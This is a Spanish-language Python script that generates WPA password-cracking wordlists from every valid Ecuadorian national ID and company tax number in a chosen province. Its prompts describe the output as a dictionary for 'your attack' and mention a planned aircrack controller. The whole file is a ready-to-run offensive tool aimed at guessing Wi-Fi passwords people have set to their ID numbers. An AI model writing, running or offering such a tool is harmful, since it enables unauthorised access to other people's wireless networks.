from stdnum.ec import ci, ruc
import sys
# _*_coding:utf-8_*_
class crearDiccionario:
    def __init__(self, inicioCedula, finalCedula, provincia):
        self.inicioCedula = inicioCedula
        self.finalCedula = finalCedula
        self.provincia = provincia
        inicio = int(self.inicioCedula)
        final = int(self.finalCedula)
        archivo = open(self.provincia+'DiccionarioWPA.txt','w')
        while inicio <= final:
            numeroLetras = str(inicio)
            validarRuc = numeroLetras + '001'
            if ci.is_valid(numeroLetras):
                archivo.write(numeroLetras + '\n')
            if ruc.is_valid(validarRuc):
                archivo.write(validarRuc+'\n')
            inicio += 1
        archivo.close()
        print('Diccionario creado correctamente suerte en tú ataque')

provinciasEcuador = {'azu':'01','bol':'02','cañ':'03','car':'04','cot':'05','chi':'06','el ':'07','esm':'08','gua':'09',
'imb':'10','loj':'11','los':'12','man':'13','mor':'14','nap':'15','pas':'16','pic':'17','tun':'18',
'zam':'19','gal':'20','suc':'21','ore':'22'}

inicioCedula = '1000000000'
finalCedula = '9999999999'

respuesta = input("Necesitas crear un diccionario para tu ataque S/N: ")
if respuesta.lower() == 's':
    while True:
        provincia = input('Escribe el nombre de tu provincia: ')
        if provincia[:3] in provinciasEcuador:
            print('Espera por favor, tú diccionario se está creando')
            codigoProvincia = provinciasEcuador[provincia[:3]]
            inicioCedula = codigoProvincia+inicioCedula[2:]
            finalCedula = codigoProvincia+finalCedula[2:]
            crearDiccionario(inicioCedula,finalCedula,provincia)
            respuesta = input('Quieres crear otro diccionario S/N: ')
            if respuesta.lower() == 'n':
                break
        else:
            repetir = input('Has ingresado mal la provincia quieres volver a intentar S/N: ')
            if repetir.lower() == 'n':
                break
else:
    print("El script para controlar el aircrack esta en proceso ")
    sys.exit()
